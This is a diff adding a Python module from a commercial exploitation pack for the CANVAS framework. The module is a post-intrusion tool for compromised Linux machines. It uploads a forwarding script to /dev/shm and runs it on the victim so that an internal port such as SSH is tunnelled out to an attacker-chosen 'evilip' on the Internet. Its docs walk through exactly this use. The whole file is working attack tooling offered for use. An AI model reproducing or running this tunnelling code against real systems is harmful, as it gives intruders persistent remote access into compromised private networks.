@@ -1,0 +1,116 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+import sys, os
+import pygtk
+import gobject
+import socket
+import select
+
+
+pygtk.require("2.0")
+import gtk
+import gtk.glade
+
+sys.path.append(".")
+
+from canvasexploit import canvasexploit
+from canvaserror import *
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+VERSION                = "0.1"
+NAME                   = "d2sec_portfwd"
+DESCRIPTION            = "Tool to redirect a TCP connection from a local network to Internet."
+
+DOCUMENTATION          = {}
+DOCUMENTATION["Notes"] = """Example to access the port 22 of the compromised machine on a local network from Internet. the 
+compromised machine does not filter TCP connections on port 80:
+- localport = 22
+- redirectport = 80
+- finalport = 12345
+- evilip = your evil ip
+
+And connect to 127.0.0.1:12345 with ssh client.
+"""
+
+PROPERTY               = {}
+PROPERTY['TYPE']       = "Post-Intrusion"
+PROPERTY['ARCH']       = [ ["Linux"] ]
+
+class theexploit(canvasexploit):
+
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.name = NAME
+    self.node = '' 
+    self.supportedNodeArgs = [["linuxNode"]]
+    self.portfwd = "/dev/shm/d2sec_portfwd.py"
+    self.localport = ""
+    self.redirectport = ""
+    self.finalport = ""
+    self.evilip = "0.0.0.0"
+
+  def upload_py(self):
+    try:
+      self.log("[D2] Uploading d2sec_portfwd.py to %s..." % self.portfwd)
+      dst = os.getcwd()+"/3rdparty/D2SEC/exploits/d2sec_portfwd/Ressources/d2sec_portfwd.py"
+      self.node.shell.upload(dst, "", self.portfwd)
+    except Exception, e:
+      self.log("[D2] can't upload d2sec_portfwd.py: %s" % e)
+      return 0
+    return 1
+  
+  def run_portfwd(self):
+    try:
+      self.log("[D2] Running TCP connection redirect...")
+      self.log('[D2] And connect to 127.0.0.1:%s with your own client (ssh, ...)'%(self.finalport))
+      self.node.shell.runcommand("python2 %s %s %s %s"%(self.portfwd, self.localport, self.evilip, self.redirectport))
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return 0
+    return 1
+
+  def start_portfwd(self):
+    try:
+      self.log('[D2] Starting portfwd server...')
+      server = os.getcwd()+"/3rdparty/D2SEC/exploits/d2sec_portfwd/Ressources/d2sec_portfwd_server.py"
+      os.system("python2 %s %s %s &"%(server, self.redirectport, self.finalport))
+    except Exception, e:
+      self.log('[D2] %s'%e)
+      return 0
+    return 1
+
+  def getargs(self):
+    self.evilip = self.argsDict.get("evilip", self.evilip)
+    self.localport = self.argsDict.get("localport", self.localport)
+    self.redirectport = self.argsDict.get("redirectport", self.redirectport)
+    self.finalport = self.argsDict.get("finalport", self.finalport)
+
+  def run(self):
+    self.setInfo('[D2] Running %s module'%NAME)
+    self.log('[D2] Running %s module'%NAME)
+    self.getargs()
+    for node in self.argsDict["passednodes"]:
+      type = node.nodetype
+      if type not in self.supportedNodeArgs[0]:
+        self.log('[D2] %s node type not supported' % type)
+        continue
+      self.node = node
+    if self.upload_py():
+      if self.start_portfwd():
+        if self.run_portfwd():
+          self.setInfo('[D2] Running %s module - done (success!)'%NAME)
+          return 1
+    self.setInfo('[D2] Running %s module - done (success!)'%NAME)
+    return 1
+
+if __name__ == "__main__":
+  print "This module is meant to be run only within CANVAS"
+
